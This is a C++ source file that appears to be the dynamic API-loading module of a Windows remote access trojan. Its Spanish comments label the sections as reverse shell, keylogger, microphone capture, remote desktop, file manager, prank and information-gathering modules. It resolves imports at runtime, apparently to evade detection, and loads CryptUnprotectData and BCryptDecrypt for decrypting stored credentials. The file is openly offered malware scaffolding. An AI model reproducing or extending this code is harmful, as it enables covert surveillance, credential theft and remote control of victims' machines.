#include "mod_dynamic_load.hpp"
#include "misc.hpp"

DynamicLoad::DynamicLoad() {
    //Cargar dlls y funciones
    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
    this->hAdvapi32DLL = wrapLoadDLL("advapi32.dll");
    this->hShell32DLL = wrapLoadDLL("shell32.dll");
    this->hWtsapi32DLL = wrapLoadDLL("Wtsapi32.dll");
    this->hPsApiDLL = wrapLoadDLL("psapi.dll");
    this->hUser32DLL = wrapLoadDLL("user32.dll");


    if (this->hKernel32DLL) {
        this->KERNEL32.pGetComputerName = (st_Kernel32::LPGETCOMPUTERNAMEA)wrapGetProcAddr(this->hKernel32DLL, "GetComputerNameA");
        this->KERNEL32.pGetModuleHandleA = (st_Kernel32::LPGETMODULEHANDLEA)wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA");
        this->KERNEL32.pGetNativeSystemInfo = (st_Kernel32::LPGETNATIVESYSTEMINFO)wrapGetProcAddr(this->hKernel32DLL, "GetNativeSystemInfo");
        this->KERNEL32.pCreateProcessA = (st_Kernel32::LPCREATEPROCESSA)wrapGetProcAddr(this->hKernel32DLL, "CreateProcessA");
        this->KERNEL32.pOpenProcess = (st_Kernel32::LPOPENPROCESS)wrapGetProcAddr(this->hKernel32DLL, "OpenProcess");
        this->KERNEL32.pTerminateProcess = (st_Kernel32::LPTERMINATEPROCESS)wrapGetProcAddr(this->hKernel32DLL, "TerminateProcess");
        this->KERNEL32.pCloseHandle = (st_Kernel32::LPCLOSEHANDLE)wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
        this->KERNEL32.pGlobalMemoryStatusEx = (st_Kernel32::LPGLOBALMEMORYSTATUSEX)wrapGetProcAddr(this->hKernel32DLL, "GlobalMemoryStatusEx");
        this->KERNEL32.pCopyFileA = (st_Kernel32::LPCOPYFILEA)wrapGetProcAddr(this->hKernel32DLL, "CopyFileA");
        this->KERNEL32.pReadFile = (st_Kernel32::LPREADFILE)wrapGetProcAddr(this->hKernel32DLL, "ReadFile");
        this->KERNEL32.pWriteFile = (st_Kernel32::LPWRITEFILE)wrapGetProcAddr(this->hKernel32DLL, "WriteFile");
        this->KERNEL32.pDeleteFileA = (st_Kernel32::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");

        //Reverse shell
        this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
        this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");

    }

    if (this->hAdvapi32DLL) {
        this->ADVAPI32.pGetUserName = (st_Advapi32::LPGETUSERNAMEA)wrapGetProcAddr(this->hAdvapi32DLL, "GetUserNameA");
        this->ADVAPI32.pRegOpenKeyEx = (st_Advapi32::LPREGOPENKEY)wrapGetProcAddr(this->hAdvapi32DLL, "RegOpenKeyExA");
        this->ADVAPI32.pRegQueryValueEx = (st_Advapi32::LPREGQUERYVALUEEX)wrapGetProcAddr(this->hAdvapi32DLL, "RegQueryValueExA");
        this->ADVAPI32.pRegCloseKey = (st_Advapi32::LPREGCLOSEKEY)wrapGetProcAddr(this->hAdvapi32DLL, "RegCloseKey");
        this->ADVAPI32.pLookupAccountSidA = (st_Advapi32::LPLOOKUPACCOUNTSIDA)wrapGetProcAddr(this->hAdvapi32DLL, "LookupAccountSidA");
    }

    if (this->hShell32DLL) {
        this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
    }

    if (this->hWtsapi32DLL) {
        this->WTSAPI32.pWTSEnumerateProcessesA = (st_Wtsapi32::LPWTSENUMERATEPROCESSES)wrapGetProcAddr(this->hWtsapi32DLL, "WTSEnumerateProcessesA");
        this->WTSAPI32.pWTSFreeMemory = (st_Wtsapi32::LPWTSFREEMEMORY)wrapGetProcAddr(this->hWtsapi32DLL, "WTSFreeMemory");
    }

    if (this->hPsApiDLL) {
        this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");

    }

    this->LoadFMProcs(); //Funciones de manipulacion de archivos
    //this->LoadFunProcs();
    //this->LoadInfoProcs();
    //this->LoadKLProcs();
    //this->LoadMicProcs();
    //this->LoadRDProcs();
    //this->LoadWMProcs();
}

//Bromas
void DynamicLoad::LoadFunProcs() {
    if (!this->hWinmmDLL) {
        this->hWinmmDLL = wrapLoadDLL("winmm.dll");
    }

    if (this->hWinmmDLL) {
        this->WINMM.pMciSendStringA = (st_Winmm::LPMCISENDSTRINGA)wrapGetProcAddr(this->hWinmmDLL, "mciSendStringA");
    }

    if (this->hUser32DLL) {
        this->USER32_FUN.pSwapMouseButton = (st_User32_Fun::LPSWAPMOUSEBUTTON)wrapGetProcAddr(this->hUser32DLL, "SwapMouseButton");
        this->USER32_FUN.pBlockInput = (st_User32_Fun::LPBLOCKINPUT)wrapGetProcAddr(this->hUser32DLL, "BlockInput");
        this->USER32_FUN.pMessageBoxA = (st_User32_Fun::LPMESSAGEBOX)wrapGetProcAddr(this->hUser32DLL, "MessageBoxA");
    }
}

void DynamicLoad::UnloadFunDlls() {
    if (this->hWinmmDLL) {
        wrapFreeLibrary(this->hWinmmDLL);
    }
}

//Administrador de ventanas
void DynamicLoad::LoadWMProcs() {
    if (this->hUser32DLL) {
        this->USER32_WM.pIsWindowVisible = (st_User32_WM::LPISWINDOWVISIBLE)wrapGetProcAddr(this->hUser32DLL, "IsWindowVisible");
        this->USER32_WM.pGetWindowTextA = (st_User32_WM::LPGETWINDOWTEXTA)wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA");
        this->USER32_WM.pGetForegroundWindow = (st_User32_WM::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
        this->USER32_WM.pEnumWindows = (st_User32_WM::LPENUMWINDOWS)wrapGetProcAddr(this->hUser32DLL, "EnumWindows");
        this->USER32_WM.pFindWindowA = (st_User32_WM::LPFINDWINDOWA)wrapGetProcAddr(this->hUser32DLL, "FindWindowA");
        this->USER32_WM.pShowWindow = (st_User32_WM::LPSHOWWINDOW)wrapGetProcAddr(this->hUser32DLL, "ShowWindow");
    }
}

//Escritorio Remoto
void DynamicLoad::LoadRDProcs() {
    if (!this->hGdi32DLL) {
       this->hGdi32DLL = wrapLoadDLL("gdi32.dll");
    }
    if (!this->hGdiPlusDLL) {
        this->hGdiPlusDLL = wrapLoadDLL("gdiplus.dll");
    }
    if (!this->hOle32) {
        this->hOle32 = wrapLoadDLL("ole32.dll");
    }

    if (this->hUser32DLL) {
        this->USER32_RD.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
        this->USER32_RD.pGetDC = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
        this->USER32_RD.pGetDesktopWindow = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
        this->USER32_RD.pEnumDisplayMonitors = (st_User32_RD::LPENUMDISPLAYMONITORS)wrapGetProcAddr(this->hUser32DLL, "EnumDisplayMonitors");
        this->USER32_RD.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
        this->USER32_RD.pGetCursorInfo = (st_User32_RD::LPGETCURSORINFO)wrapGetProcAddr(this->hUser32DLL, "GetCursorInfo");
        this->USER32_RD.pGetIconInfo = (st_User32_RD::LPGETICONINFO)wrapGetProcAddr(this->hUser32DLL, "GetIconInfo");
        this->USER32_RD.pDrawIconEx = (st_User32_RD::LPDRAWICONEX)wrapGetProcAddr(this->hUser32DLL, "DrawIconEx");
        this->USER32_RD.pGetWindowRect = (st_User32_RD::LPGETWINDOWRECT)wrapGetProcAddr(this->hUser32DLL, "GetWindowRect");

    }

    if (this->hGdi32DLL) {
        this->GDI32_RD.pCreateCompatibleDC = (st_Gdi32::LPCREATECOMPATIBLEDC)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleDC");
        this->GDI32_RD.pCreateCompatibleBitmap = (st_Gdi32::LPCREATECOMPATIBLEBITMAP)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleBitmap");
        this->GDI32_RD.pSelectObject = (st_Gdi32::LPSELECTOBJECT)wrapGetProcAddr(this->hGdi32DLL, "SelectObject");
        this->GDI32_RD.pGetObjectA = (st_Gdi32::LPGETOBJECTA)wrapGetProcAddr(this->hGdi32DLL, "GetObjectA");
        this->GDI32_RD.pBitBlt = (st_Gdi32::LPBITBLT)wrapGetProcAddr(this->hGdi32DLL, "BitBlt");
    }

    if (this->hOle32) {
        this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
    }

    if (this->hGdiPlusDLL) {
        this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
        this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
    }
}

void DynamicLoad::UnloadRDDlls() {
    if (this->hGdi32DLL) {
        wrapFreeLibrary(this->hGdi32DLL);
    }

    if (this->hGdiPlusDLL) {
        wrapFreeLibrary(this->hGdiPlusDLL);
    }

    if (this->hOle32) {
        wrapFreeLibrary(this->hOle32);
    }
}

//Microfono
void DynamicLoad::LoadMicProcs() {
    if (!this->hWinmmDLL) {
        this->hWinmmDLL = wrapLoadDLL("winmm.dll");
    }

    if (this->hWinmmDLL) {
        this->WINMMMIC.pWaveInGetDevCapsA = (st_WinmmMic::LPWAVEINGETDEVCAPSA)wrapGetProcAddr(this->hWinmmDLL, "waveInGetDevCapsA");
        this->WINMMMIC.pWaveInGetNumDevs = (st_WinmmMic::LPWAVEINGETNUMDEVS)wrapGetProcAddr(this->hWinmmDLL, "waveInGetNumDevs");
        this->WINMMMIC.pWaveInOpen = (st_WinmmMic::LPWAVEINOPEN)wrapGetProcAddr(this->hWinmmDLL, "waveInOpen");
        this->WINMMMIC.pWaveInStart = (st_WinmmMic::LPWAVEINSTART)wrapGetProcAddr(this->hWinmmDLL, "waveInStart");
        this->WINMMMIC.pWaveInStop = (st_WinmmMic::LPWAVEINSTOP)wrapGetProcAddr(this->hWinmmDLL, "waveInStop");
        this->WINMMMIC.pWaveInClose = (st_WinmmMic::LPWAVEINCLOSE)wrapGetProcAddr(this->hWinmmDLL, "waveInClose");
        this->WINMMMIC.pWaveInPrepareHeader = (st_WinmmMic::LPWAVEINPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInPrepareHeader");
        this->WINMMMIC.pWaveInUnprepareHeader = (st_WinmmMic::LPWAVEINUNPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInUnprepareHeader");
        this->WINMMMIC.pWaveInAddBuffer = (st_WinmmMic::LPWAVEINADDBUFFER)wrapGetProcAddr(this->hWinmmDLL, "waveInAddBuffer");
    }
}

void DynamicLoad::UnloadMicProcs() {
    if (this->hWinmmDLL) {
        wrapFreeLibrary(this->hWinmmDLL);
    }
}

//Keylogger
void DynamicLoad::LoadKLProcs() {
    if (this->hKernel32DLL) {
        this->KERNEL32.pGetModuleHandleA = (st_Kernel32::LPGETMODULEHANDLEA)wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA");
    }

    if (this->hUser32DLL) {
        this->USER32_KL.pGetWindowTextA = (st_User32_KL::LPGETWINDOWTEXTA)wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA");
        this->USER32_KL.pGetForegroundWindow = (st_User32_KL::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
        this->USER32_KL.pUnhookWindowsHookEx = (st_User32_KL::LPUNHOOKWINDOWSHOOKEX)wrapGetProcAddr(this->hUser32DLL, "UnhookWindowsHookEx");
        this->USER32_KL.pCallNextHookEx = (st_User32_KL::LPCALLNEXTHOOKEX)wrapGetProcAddr(this->hUser32DLL, "CallNextHookEx");
        this->USER32_KL.pSetWindowsHookExA = (st_User32_KL::LPSETWINDOWSHOOKEXA)wrapGetProcAddr(this->hUser32DLL, "SetWindowsHookExA");
        this->USER32_KL.pPostQuitMessage = (st_User32_KL::LPPOSTQUITMESSAGE)wrapGetProcAddr(this->hUser32DLL, "PostQuitMessage");
        this->USER32_KL.pPeekMessageA = (st_User32_KL::LPPEEKMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "PeekMessageA");
        this->USER32_KL.pGetMessageA = (st_User32_KL::LPGETMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "GetMessageA");
        this->USER32_KL.pTranslateMessage = (st_User32_KL::LPTRANSLATEMESSAGE)wrapGetProcAddr(this->hUser32DLL, "TranslateMessage");
        this->USER32_KL.pDispatchMessageA = (st_User32_KL::LPDISPATCHMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA");
    }
}

//Informacion
void DynamicLoad::LoadInfoProcs() {
    this->hBCryptDLL = wrapLoadDLL("Bcrypt.dll");
    this->hCrypt32DLL = wrapLoadDLL("Crypt32.dll");
    this->hNetApi32DLL = wrapLoadDLL("Netapi32.dll");

    if (this->hBCryptDLL) {
        this->BCRYPT.pBCryptDecrypt = (st_Bcrypt::LPBCRYPTDECRYPT)wrapGetProcAddr(this->hBCryptDLL, "BCryptDecrypt");
        this->BCRYPT.pBCryptGenerateSymmetricKey = (st_Bcrypt::LPBCRYPTGENERATESYMMETRICKEY)wrapGetProcAddr(this->hBCryptDLL, "BCryptGenerateSymmetricKey");
        this->BCRYPT.pBCryptOpenAlgorithmProvider = (st_Bcrypt::LPLPBCRYPTOPENALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptOpenAlgorithmProvider");
        this->BCRYPT.pBCryptCloseAlgorithmProvider = (st_Bcrypt::LPBCRYPTCLOSEALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptCloseAlgorithmProvider");
        this->BCRYPT.pBCryptSetProperty = (st_Bcrypt::LPBCRYPTSETPROPERTY)wrapGetProcAddr(this->hBCryptDLL, "BCryptSetProperty");
    }

    if (hCrypt32DLL) {
        this->CRYPT32.pCryptUnprotectData = (st_Crypt32::LPCRYPTUNPROTECTDATA)wrapGetProcAddr(this->hCrypt32DLL, "CryptUnprotectData");
    }

    if (hNetApi32DLL) {
        this->NETAPI32.pNetUserEnum = (st_Netapi32::LPNETUSERENUM)wrapGetProcAddr(this->hNetApi32DLL, "NetUserEnum");
        this->NETAPI32.pNetApiBufferFree = (st_Netapi32::LPNETAPIBUFFERFREE)wrapGetProcAddr(this->hNetApi32DLL, "NetApiBufferFree");
    }
}

void DynamicLoad::UnloadInfoProcs() {
    if (this->hBCryptDLL) {
        wrapFreeLibrary(this->hBCryptDLL);
    }

    if (this->hCrypt32DLL) {
        wrapFreeLibrary(this->hCrypt32DLL);
    }

    if (this->hNetApi32DLL) {
        wrapFreeLibrary(this->hNetApi32DLL);
    }
}

//Adm archivos
void DynamicLoad::LoadFMProcs() {
    if (this->hKernel32DLL) {
        this->KERNEL32_FM.pGetLogicalDriveStringsA = (st_Kernel32_FM::LPGETLOGICALDRIVESTRINGSA)wrapGetProcAddr(this->hKernel32DLL, "GetLogicalDriveStringsA");
        this->KERNEL32_FM.pGetVolumeInformationA = (st_Kernel32_FM::LPGETVOLUMEINFORMATIONA)wrapGetProcAddr(this->hKernel32DLL, "GetVolumeInformationA");
        this->KERNEL32_FM.pGetDriveTypeA = (st_Kernel32_FM::LPGETDRIVETYPEA)wrapGetProcAddr(this->hKernel32DLL, "GetDriveTypeA");
        this->KERNEL32_FM.pGetDiskFreeSpaceExA = (st_Kernel32_FM::LPGETDISKFREESPACEEXA)wrapGetProcAddr(this->hKernel32DLL, "GetDiskFreeSpaceExA");
        this->KERNEL32_FM.pFindFirstFileA = (st_Kernel32_FM::LPFINDFIRSTFILEA)wrapGetProcAddr(this->hKernel32DLL, "FindFirstFileA");
        this->KERNEL32_FM.pFileTimeToSystemTime = (st_Kernel32_FM::LPFILETIMETOSYSTEMTIME)wrapGetProcAddr(this->hKernel32DLL, "FileTimeToSystemTime");
        this->KERNEL32_FM.pFindNextFileA = (st_Kernel32_FM::LPFINDNEXTFILEA)wrapGetProcAddr(this->hKernel32DLL, "FindNextFileA");
        this->KERNEL32_FM.pFindClose = (st_Kernel32_FM::LPFINDCLOSE)wrapGetProcAddr(this->hKernel32DLL, "FindClose");
        this->KERNEL32_FM.pCreateDirectoryA = (st_Kernel32_FM::LPCREATEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "CreateDirectoryA");
        this->KERNEL32_FM.pCreateFileA = (st_Kernel32_FM::LPCREATEFILEA)wrapGetProcAddr(this->hKernel32DLL, "CreateFileA");
        this->KERNEL32_FM.pCloseHandle = (st_Kernel32_FM::LPCLOSEHANDLE)wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
        this->KERNEL32_FM.pDeleteFileA = (st_Kernel32_FM::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");
        this->KERNEL32_FM.pMoveFileA = (st_Kernel32_FM::LPMOVEFILEA)wrapGetProcAddr(this->hKernel32DLL, "MoveFileA");
        this->KERNEL32_FM.pRemoveDirectoryA = (st_Kernel32_FM::LPREMOVEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "RemoveDirectoryA");
    }
}

DynamicLoad::~DynamicLoad() {
    //Cerrar dlls
    if (this->hKernel32DLL) {
        wrapFreeLibrary(this->hKernel32DLL);
    }

    if (this->hAdvapi32DLL) {
        wrapFreeLibrary(this->hAdvapi32DLL);
    }

    if (this->hShell32DLL) {
        wrapFreeLibrary(this->hShell32DLL);
    }

    if (this->hWtsapi32DLL) {
        wrapFreeLibrary(this->hWtsapi32DLL);
    }

    if (this->hPsApiDLL) {
        wrapFreeLibrary(this->hPsApiDLL);
    }

    if (this->hUser32DLL) {
        wrapFreeLibrary(this->hUser32DLL);
    }
}
